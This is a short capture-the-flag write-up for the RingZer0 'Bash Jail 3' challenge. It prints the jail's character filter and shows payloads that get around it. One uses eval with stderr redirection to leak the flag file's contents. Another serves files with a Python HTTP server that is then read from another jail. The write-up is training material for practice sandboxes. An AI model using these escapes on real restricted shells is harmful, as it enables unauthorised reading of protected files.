# **Bash Jail 3**

```
ubuntu@ubuntu-virtual-machine:~$ ssh level3@challenges.ringzer0team.com -p 10220
level3@challenges.ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
	if [[ $1 == *[bdksc]* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input` &>/dev/null
		echo "Command executed"
	fi
done 

-----------------------------
Your input:
```

```
Your input:
eval $(<flag.txt) 2>&0
./real.sh: line 39: FLAG-XXXXXX: command not found
Command executed
```

Another method

```
Your input:
s
Restricted characters has been used
Your input:
S
Your input:
python -m SimpleHTTPServer
```

Back to Bash Jail 1.

```
/bin/bash

level1@lxc17-bash-jail:~$ python3 1>&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
\[GCC 4.8.4\] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>\> import urllib.request
>>\> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-XXXXXX
```